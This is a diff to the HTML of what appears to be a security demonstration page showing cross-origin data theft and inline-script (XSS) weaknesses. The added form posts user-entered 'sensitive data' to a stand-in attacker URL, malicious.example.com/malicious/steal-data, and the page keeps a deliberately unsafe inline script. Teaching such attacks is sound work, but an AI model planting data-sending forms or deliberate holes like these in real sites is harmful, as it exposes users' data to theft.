@@ -35,11 +35,12 @@
             
             <div class="demo-form">
                 <h3>Cross-Origin Data Submission Test</h3>
-                <form id="crossOriginForm" onsubmit="return submitToCrossOrigin(event)">
-                    <input type="text" id="sensitiveData" placeholder="Sensitive data" required>
+                <form action="http://malicious.example.com:3000/malicious/steal-data" method="POST" target="_blank">
+                    <input type="hidden" name="source" value="vulnerable.example.com">
+                    <input type="text" name="sensitiveData" placeholder="Sensitive data" required>
                     <button type="submit" class="dangerous">Submit to Malicious Domain</button>
                 </form>
-                <div id="crossOriginResult"></div>
+                <p><em>⚠️ This will open malicious domain in new tab showing data capture</em></p>
             </div>
             
             <div class="demo-form">
@@ -59,6 +60,10 @@
                     <li>✅ Cross-origin requests succeed</li>
                     <li>✅ No browser security warnings in console</li>
                 </ul>
+                
+                <div style="margin-top: 1.5rem; text-align: center;">
+                    <a href="/vulnerable/code" target="_blank" class="demo-button">📝 View JavaScript Code</a>
+                </div>
             </div>
         </div>
     </main>
@@ -92,33 +97,6 @@
             return false;
         }
         
-        function submitToCrossOrigin(event) {
-            event.preventDefault();
-            const data = document.getElementById('sensitiveData').value;
-            
-            fetch('/malicious/steal-data', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ sensitiveData: data })
-            })
-            .then(response => response.json())
-            .then(result => {
-                document.getElementById('crossOriginResult').innerHTML = 
-                    `<div class="result-success">
-                        ⚠️ Data successfully sent to malicious domain: ${result.message}
-                    </div>`;
-            })
-            .catch(error => {
-                document.getElementById('crossOriginResult').innerHTML = 
-                    `<div class="result-error">
-                        ⚠️ Cross-origin request failed: ${error.message}
-                    </div>`;
-            });
-            
-            return false;
-        }
         
         function testInlineScript() {
             alert('Inline script executed successfully! This is an XSS vulnerability.');
